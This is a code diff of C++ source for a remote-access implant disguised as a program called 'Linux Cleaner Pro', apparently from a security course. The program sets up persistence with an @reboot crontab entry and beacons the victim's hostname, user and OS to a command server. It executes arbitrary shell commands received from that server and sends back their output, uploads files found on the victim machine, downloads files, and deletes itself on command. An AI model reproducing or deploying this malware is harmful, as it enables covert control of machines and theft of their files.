@@ -5,9 +5,11 @@
 #include <fstream>
 #include <array>
 
+#include "rapidjson/document.h"
 #include "curl/curl.h"
 
 using namespace std; 
+using namespace rapidjson;
 
 const string HOST_URL = "http://cs4001.root.sx:3000/";
 
@@ -52,8 +54,9 @@ string exec(string cmd) {
         output += buffer.data();
     }
 
-    if(output.length() != 0)
+    if (output.length() != 0) {
         output.erase(output.length()-1); // remove last newline
+    }
 
     return output;
 }
@@ -123,173 +126,109 @@ void upload_file(string url, string location, string id) {
 
     curl = curl_easy_init();
     if(curl) {
-        /* Create the form */
         form = curl_mime_init(curl);
 
-        /* Fill in the client ID field */
         field = curl_mime_addpart(form);
         curl_mime_name(field, "id");
         curl_mime_data(field, id.c_str(), CURL_ZERO_TERMINATED);
 
-        /* Fill in the file upload field */
         field = curl_mime_addpart(form);
         curl_mime_name(field, "file");
         curl_mime_filedata(field, location.c_str());
 
-        /* Fill in the filename field */
         field = curl_mime_addpart(form);
         curl_mime_name(field, "filename");
         curl_mime_data(field, location.c_str(), CURL_ZERO_TERMINATED);
 
-        /* Fill in the submit field too, even if this is rarely needed */
         field = curl_mime_addpart(form);
         curl_mime_name(field, "submit");
         curl_mime_data(field, "send", CURL_ZERO_TERMINATED);
 
-        /* initialize custom header list (stating that Expect: 100-continue is not
-             wanted */
         headerlist = curl_slist_append(headerlist, buf);
-        /* what URL that receives this POST */
         curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
         curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
 
-        /* Perform the request, res will get the return code */
         res = curl_easy_perform(curl);
-        /* Check for errors */
-        if(res != CURLE_OK)
+        if(res != CURLE_OK) {
             fprintf(stderr, "curl_easy_perform() failed: %s\n",
-                            curl_easy_strerror(res));
+                    curl_easy_strerror(res));
+        }
 
-        /* always cleanup */
         curl_easy_cleanup(curl);
-
-        /* then cleanup the form */
         curl_mime_free(form);
-        /* free slist */
         curl_slist_free_all(headerlist);
     }
 }
 
-void make_shell_persistance() {
-    //Create shell script to launch implant
-    string file_path = "'" + exec("readlink -f a.out") + "'";
-    string shellfile = "#! /bin/sh\n" + file_path;
+void make_shell_persistence(string filename) {
+    string path = exec("readlink -f " + filename);
+    exec("echo @reboot " + path + " | crontab -");
+}
 
-    //Write script to file
-    const char *write_path = "script.sh";
-    std::ofstream out(write_path);
-    out << shellfile;
-    out.close();
+void mass_upload(string name, string location, string id) {
+    string output = exec("find " + location + " -type f -name \"" + name + "\"");
+    char* token = strtok(const_cast<char*>(output.c_str()), "\n");
 
-    //Get persistance of launch script
-    string script_path = exec("readlink -f script.sh");
-    string sys_cmd = "( echo '@reboot sh "+ script_path +"' ) | crontab -";
-
-    //Run scrip on Linux
-    string os = get_os();
-    if(os == "Linux"){
-        system(sys_cmd.c_str());
+    while (token != NULL) {
+        upload_file(HOST_URL + "upload", string(token), id);
+        token = strtok(NULL, "\n");
     }
 }
 
-void mass_upload(string command, string id) {
-
-    //This trash fire finds only the cd commands
-    // to get path later
-    string usePATH = "";
-    string getPATH = command;
-    string tempHelp;
-    while( getPATH.length() != 0 ) {
-
-        tempHelp = getPATH.substr( 0, getPATH.find(";") + 1 );
-        if(tempHelp.substr(0,2) == "cd" ){
-            usePATH.append(tempHelp);
-            usePATH.append(" ");
-        }
-
-        //two spaces, one for ; and one for ' '
-        getPATH = getPATH.substr( getPATH.find(";") + 2 );
-        if(getPATH.find(";") == std::string::npos){
-            break;
-        }
-    }
-    // get that path and create a string of what to find
-    string path = exec(usePATH + "pwd");
-    string filesToUpload = exec(command);
-
-    string tempFileName;
-
-    // get the path string for each file found
-    while( filesToUpload.length() != 0 ) {
-
-        if( filesToUpload.find("\n") != std::string::npos )
-        {
-            tempFileName = filesToUpload.substr(0, filesToUpload.find("\n") + 1);
-            filesToUpload = filesToUpload.substr( filesToUpload.find("\n") + 1 );
-
-            tempFileName.erase(tempFileName.length()-1); // remove last newline
-        }else{
-            tempFileName = filesToUpload;
-            filesToUpload = "";
-        }
-        
-        upload_file(HOST_URL + "upload", path + "/" + tempFileName, id);
-        this_thread::sleep_for(chrono::seconds(3));
-    }
-}
-
-int main() {
+int main(int argc, char* argv[]) {
     cout << "Starting up Linux Cleaner Pro!" << endl;
     cout << "The best optoin for best running!!!!!!!! :)" << endl;
-    cout.setstate(std::ios_base::failbit);
 
-    int wait_for_command_time = 3;
+    int delay = 3;
     string hostname = exec("hostname");
     string user = exec("id -un");
     string os = get_os();
+    string response;
+ 
+    make_shell_persistence(string(argv[0]));
 
-    make_shell_persistance();
-
-    string id = "";
-    while(id == "")
-    {
-        this_thread::sleep_for(chrono::seconds(3));
-        id = post(HOST_URL + "connect", "hostname=" + hostname +
-                "&user=" + user + "&os=" + os);
+    // wait for server
+    while (response.empty()) {
+        response = post(HOST_URL + "connect", "hostname=" + hostname +
+                    "&user=" + user + "&os=" + os);
+        this_thread::sleep_for(chrono::seconds());
     }
 
+    Document document;
+    document.Parse(response.c_str());
+
+    string id = document["id"].GetString();
+
     while (true) {
-        string command = post(HOST_URL + "command", "id=" + id);
-        string MacroCmd = command.substr(0, command.find("&"));
-        command = command.substr(command.find("&")+1);
+        response = post(HOST_URL + "command", "id=" + id);
 
-        if( MacroCmd == "find" ) {
-            mass_upload(command, id);
+        if (!response.empty()) {
+            document.Parse(response.c_str());
+            string type = document["type"].GetString();
 
-        }else 
-        if( MacroCmd == "time" ) {
-            wait_for_command_time = stoi( command );
-
-        } else 
-        if( MacroCmd == "disconnect" ) {
-            post(HOST_URL + "disconnect", "id=" + id);
-            exec("rm script.sh");
-            exec("rm a.out");
-            exec("crontab -r");
-            break;
-        } else 
-        if( MacroCmd == "command") {
-            string output = exec(command);
-            post(HOST_URL + "output", "id=" + id + "&output=" + output);
-
-        } else
-        if ( MacroCmd == "download") {
-            string dir = exec("pwd");
-            string name = command.substr( command.find_last_of("/") + 1 );
-            download_file(command, dir + "/" + name);
+            if (type == "cmd") {
+                string cmd = document["data"].GetString();
+                string output = exec(cmd);
+                post(HOST_URL + "output", "id=" + id + "&output=" + output);
+            } else if (type == "kill") {
+                post(HOST_URL + "disconnect", "id=" + id);
+                exec("rm " + string(argv[0]));
+                exec("crontab -r");
+                break;
+            } else if(type == "find") {
+                string name = document["data"]["name"].GetString();
+                string location = document["data"]["name"].GetString();
+                mass_upload(name, location, id);
+            } else if (type == "delay") {
+                delay = document["data"].GetInt();
+            } else if (type == "download") {
+                string url = document["data"]["url"].GetString();
+                string location = document["data"]["location"].GetString();
+                download_file(url, location);
+            }
         }
 
-        this_thread::sleep_for(chrono::seconds( wait_for_command_time ));
+        this_thread::sleep_for(chrono::seconds(delay));
     }
 
     return 0;
